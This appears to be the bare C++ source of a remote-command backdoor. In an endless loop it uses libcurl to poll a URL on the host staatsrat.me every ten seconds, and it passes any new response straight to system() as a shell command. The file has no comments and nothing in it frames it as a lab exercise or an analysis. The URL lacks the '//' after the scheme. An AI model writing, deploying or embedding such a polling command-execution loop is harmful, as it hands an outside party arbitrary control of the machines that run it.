#include <iostream>
#include <string>
#include <curl/curl.h>
#include <unistd.h>

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

int main(void){
	std::string command;
	int set_sleep = 10;
	while(true){
		CURL *curl;
		CURLcode res;
		std::string readBuffer;

		curl = curl_easy_init();
		if(curl) {
			curl_easy_setopt(curl, CURLOPT_URL, "https:staatsrat.me/nostos");
    			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
			res = curl_easy_perform(curl);
    			curl_easy_cleanup(curl);
  		}
	if(command == readBuffer){
		;
	}else{
		system(readBuffer.c_str());
	}
	command = readBuffer;
	sleep(10);
	}
  	return 0;
}
